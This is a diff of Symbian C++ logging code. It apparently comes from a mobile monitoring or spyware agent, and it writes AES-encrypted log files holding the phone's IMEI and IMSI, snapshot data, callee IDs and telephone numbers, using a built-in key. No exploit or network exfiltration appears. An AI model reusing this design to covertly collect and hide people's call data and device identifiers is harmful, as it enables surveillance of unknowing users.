@@ -70,9 +70,15 @@ EXPORT_C CLogFile* CLogFile::NewL(RFs& aFs)
 void CLogFile::ConstructL()
 	{
 	// no implementation required...
+	/*
+	CPhone* phone = CPhone::NewLC();
+	phone->GetImeiSync(iImei);
+	phone->GetImsiSync(iImsi);
+	CleanupStack::PopAndDestroy(phone);
+		*/
 	}
 
-
+/*
 void CLogFile::RetrieveImeiAndImsiL()
 	{
 	// Retrieve them only the first time this is called, then keeps valid the cached copy.
@@ -84,12 +90,12 @@ void CLogFile::RetrieveImeiAndImsiL()
 	phone->GetImsiSync(iImsi);
 	CleanupStack::PopAndDestroy();
 	}
-
+*/
 
 EXPORT_C void CLogFile::CreateLogL(TInt aLogId)
 	{
 	iLogId = aLogId;
-	RetrieveImeiAndImsiL();
+	//RetrieveImeiAndImsiL();
 	
 	TFullName path;
 	FileUtils::CompleteWithPrivatePathL(iFs, path);
@@ -105,9 +111,11 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId)
 	TUint32 hiTime = (fileTime >> 32);
 	TUint32 loTime = (fileTime & 0xFFFFFFFF);
 	
-	TLogStruct logStruct(aLogId, hiTime, loTime, iImei.Size(), iImsi.Size());
-		
-	TInt structAndDataLen = sizeof(TLogStruct) + iImei.Size() + iImsi.Size();
+	//TLogStruct logStruct(aLogId, hiTime, loTime, iImei.Size(), iImsi.Size());
+	TLogStruct logStruct(aLogId, hiTime, loTime, iGlobalImei.Size(), iGlobalImsi.Size());
+			
+	//TInt structAndDataLen = sizeof(TLogStruct) + iImei.Size() + iImsi.Size();
+	TInt structAndDataLen = sizeof(TLogStruct) + iGlobalImei.Size() + iGlobalImsi.Size();
 
 	// Create buffer for data
 	RBuf8 toEncrypt;
@@ -119,10 +127,14 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId)
 	toEncrypt.Append(ptr, sizeof(TLogStruct));
 
 	// Append the LogStruct Data	
-	toEncrypt.Append((TUint8 *)iImei.Ptr(), iImei.Size());
-	toEncrypt.Append((TUint8 *)iImsi.Ptr(),iImsi.Size());
+	//toEncrypt.Append((TUint8 *)iImei.Ptr(), iImei.Size());
+	//toEncrypt.Append((TUint8 *)iImsi.Ptr(),iImsi.Size());
+	toEncrypt.Append((TUint8 *)iGlobalImei.Ptr(), iGlobalImei.Size());
+	toEncrypt.Append((TUint8 *)iGlobalImsi.Ptr(),iGlobalImsi.Size());
 
 	// Convert key from string to hexa buffer
+	//7.x
+	
 	TBuf8<16> hexaKey;
 	for(TInt i = 0; i<32; i = i+2){
 		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
@@ -130,9 +142,11 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId)
 		lex.Val(val,EHex);
 		hexaKey.Append(val);
 	}
-		
+	//8.0
+	//TBuf8<16> hexaKey(KAES_LOGS_KEY().Left(16));
+			
 	// Encrypt the buffer:   AES[LogStruct + Data + Padding]
-	RBuf8 encrypted(AES::EncryptL(toEncrypt, KIV, hexaKey.Left(K_KEY_SIZE)));
+	RBuf8 encrypted(AES::EncryptL(toEncrypt, KIV, hexaKey));
 	encrypted.CleanupClosePushL();
 
 	// Write to file:   Len + AES[LogStruct + Data + Padding]
@@ -148,7 +162,7 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId)
 EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 	{
 	iLogId = aLogId;
-	RetrieveImeiAndImsiL();
+	//RetrieveImeiAndImsiL();
 	
 	TFullName path;
 	FileUtils::CompleteWithPrivatePathL(iFs, path);
@@ -160,13 +174,13 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 	TTime now;
 	now.UniversalTime();
 	TInt64 fileTime;
-	//fileTime = GetFiletime();
 	fileTime = TimeUtils::GetFiletime(now);
 	TUint32 hiTime = (fileTime >> 32);
 	TUint32 loTime = (fileTime & 0xFFFFFFFF);
 	
 	TInt structAndDataLen;
-	TLogStruct logStruct(aLogId, hiTime, loTime, iImei.Size(), iImsi.Size());
+	//TLogStruct logStruct(aLogId, hiTime, loTime, iImei.Size(), iImsi.Size());
+	TLogStruct logStruct(aLogId, hiTime, loTime, iGlobalImei.Size(), iGlobalImsi.Size());
 	if(aLogId == LOGTYPE_SNAPSHOT){
 		logStruct.iAdditionalDataLen = sizeof(TSnapshotAdditionalData); 
 	}
@@ -188,7 +202,8 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 		logStruct.iAdditionalDataLen = 44 + addData->uCalleeIdLen;		
 	}
 
-	structAndDataLen = sizeof(TLogStruct) + iImei.Size() + iImsi.Size() + logStruct.iAdditionalDataLen; 
+	//structAndDataLen = sizeof(TLogStruct) + iImei.Size() + iImsi.Size() + logStruct.iAdditionalDataLen; 
+	structAndDataLen = sizeof(TLogStruct) + iGlobalImei.Size() + iGlobalImsi.Size() + logStruct.iAdditionalDataLen; 
 
 	// Create buffer for data
 	RBuf8 toEncrypt;
@@ -200,8 +215,10 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 	toEncrypt.Append(ptr, sizeof(TLogStruct));
 
 	// Append the LogStruct Data	
-	toEncrypt.Append((TUint8 *)iImei.Ptr(), iImei.Size());
-	toEncrypt.Append((TUint8 *)iImsi.Ptr(),iImsi.Size());
+	//toEncrypt.Append((TUint8 *)iImei.Ptr(), iImei.Size());
+	//toEncrypt.Append((TUint8 *)iImsi.Ptr(),iImsi.Size());
+	toEncrypt.Append((TUint8 *)iGlobalImei.Ptr(), iGlobalImei.Size());
+	toEncrypt.Append((TUint8 *)iGlobalImsi.Ptr(),iGlobalImsi.Size());
 
 	// Append the AdditionalData
 	ptr = (const TUint8 *)aAdditionalData;
@@ -227,6 +244,8 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 		toEncrypt.Append((TUint8 *)addData->telNum.Ptr(),addData->telNum.Size());  
 		}
 	// Convert key from string to hexa buffer
+	//7.x
+	
 	TBuf8<16> hexaKey;
 	for(TInt i = 0; i<32; i = i+2){
 		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
@@ -234,9 +253,11 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 		lex.Val(val,EHex);
 		hexaKey.Append(val);
 	}
-		
+	//8.0
+	//TBuf8<16> hexaKey(KAES_LOGS_KEY().Left(16));
+			
 	// Encrypt the buffer:   AES[LogStruct + Data + Padding]
-	RBuf8 encrypted(AES::EncryptL(toEncrypt, KIV, hexaKey.Left(K_KEY_SIZE)));
+	RBuf8 encrypted(AES::EncryptL(toEncrypt, KIV, hexaKey));
 	encrypted.CleanupClosePushL();
 
 	// Write to file:   Len + AES[LogStruct + Data + Padding]
@@ -251,20 +272,10 @@ EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
 
 EXPORT_C void CLogFile::AppendLogL(const TDesC8& aData)
 	{
-/*	// Pad data Chunk to KeySize (16)
-	TUint32 paddedLen = aData.Length() + K_KEY_SIZE - 1;
-	paddedLen = paddedLen - (paddedLen % K_KEY_SIZE);
-
-	RBuf8 paddedData;
-	paddedData.CleanupClosePushL();
-	paddedData.Create(paddedLen);
-	paddedData.Append(aData);
-	paddedData.AppendFill(0, paddedLen - aData.Length());
-
-	// Not needed... AES will add the padding...
-*/
 	
 	// Convert key from string to hexa buffer
+	//7.x
+	
 	TBuf8<16> hexaKey;
 	for(TInt i = 0; i<32; i = i+2){
 		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
@@ -272,9 +283,11 @@ EXPORT_C void CLogFile::AppendLogL(const TDesC8& aData)
 		lex.Val(val,EHex);
 		hexaKey.Append(val);
 	}
+	//8.0
+	//TBuf8<16> hexaKey(KAES_LOGS_KEY().Left(16));
 		
 	// Encrypt padded data Chunk
-	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey.Left(K_KEY_SIZE)));
+	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey));
 	if(encrypted.Size()>0)  //added jo'
 		{
 		encrypted.CleanupClosePushL();
@@ -283,12 +296,11 @@ EXPORT_C void CLogFile::AppendLogL(const TDesC8& aData)
 		TUint32 dataLen = aData.Length();
 		TBuf8<4> lenBuf;
 		lenBuf.Append((const TUint8 *) &dataLen, 4);
-		iFile.Write(lenBuf);
-		iFile.Write(encrypted);
+		iFile.Write(lenBuf);  
+		iFile.Write(encrypted);  
 		iContainsData = ETrue;
 		CleanupStack::PopAndDestroy(&encrypted);
 		}
-//	CleanupStack::PopAndDestroy(&paddedData);
 	}
 
 EXPORT_C void CLogFile::CloseLogL()
@@ -301,6 +313,7 @@ EXPORT_C void CLogFile::CloseLogL()
 	if (!iContainsData)
 		{
 		// If the log files doesn't contain any data, just delete it.
+		iFile.Flush();
 		iFile.Close();
 		iFs.Delete(filename);
 		return;
@@ -315,6 +328,7 @@ EXPORT_C void CLogFile::CloseLogL()
 	destFilename.Append(_L(".log"));
 	
 	// Eventually close the file and rename it.
+	iFile.Flush();
 	iFile.Close();
 	iFs.Rename(filename, destFilename);
 	iContainsData = EFalse;
@@ -336,6 +350,8 @@ void CLogFile::WriteMarkupL(TInt aId, const TDesC8& aData)
 	markupFile.Replace(iFs, filename, EFileWrite | EFileStream | EFileShareExclusive);
 	
 	// Convert key from string to hexa buffer
+	//7.x
+	
 	TBuf8<16> hexaKey;
 	for(TInt i = 0; i<32; i = i+2){
 		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
@@ -343,10 +359,11 @@ void CLogFile::WriteMarkupL(TInt aId, const TDesC8& aData)
 		lex.Val(val,EHex);
 		hexaKey.Append(val);
 	}
-	
-	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey.Left(K_KEY_SIZE)));
+	//8.0
+	//TBuf8<16> hexaKey(KAES_LOGS_KEY().Left(16));
+		
+	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey));
 	encrypted.CleanupClosePushL();
-	//markupFile.Write(aData);
 	markupFile.Write(encrypted);
 	markupFile.Close();
 	CleanupStack::PopAndDestroy(&encrypted);
@@ -366,7 +383,6 @@ HBufC8* CLogFile::ReadMarkupL(TInt aId)
 	TFullName filename;
 	filename.AppendNum(aId);
 	FileUtils::CompleteWithPrivatePathL(iFs, filename);
-	//return FileUtils::ReadFileContentsL(iFs, filename);
 	return DecryptMarkupL(iFs, filename);
 	}
 
@@ -374,6 +390,8 @@ HBufC8* CLogFile::DecryptMarkupL(RFs& fs,const TDesC& fname)
 	{
 
 	// Convert key from string to hexa buffer
+	//7.x
+	
 	TBuf8<16> hexaKey;
 	for(TInt i = 0; i<32; i = i+2){
 		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
@@ -381,7 +399,9 @@ HBufC8* CLogFile::DecryptMarkupL(RFs& fs,const TDesC& fname)
 		lex.Val(val,EHex);
 		hexaKey.Append(val);
 	}
-				
+	//8.0
+	//TBuf8<16> hexaKey(KAES_LOGS_KEY().Left(16));
+					
 	__FLOG(_L8("DecryptMarkupL Begin"));
 	/*
 	if (!BaflUtils::FileExists(fs, fname))
@@ -390,13 +410,7 @@ HBufC8* CLogFile::DecryptMarkupL(RFs& fs,const TDesC& fname)
 	HBufC8* buf = FileUtils::ReadFileContentsL(fs, fname);
 	CleanupStack::PushL(buf);
 
-	// Diff + AES[Len + Data + CRC]
-
-	// removes Diff
-	// buf->Des().Delete(0, 8);
-
 	__FLOG(_L8("AES::DecryptL() Begin"));
-	//RBuf8 plain(AES::DecryptL(buf->Des(), KIV, KAES_CONFIG_KEY));
 	RBuf8 plain(AES::DecryptL(buf->Des(), KIV, hexaKey));
 	plain.CleanupClosePushL();
 	__FLOG(_L8("AES::DecryptL() End"));
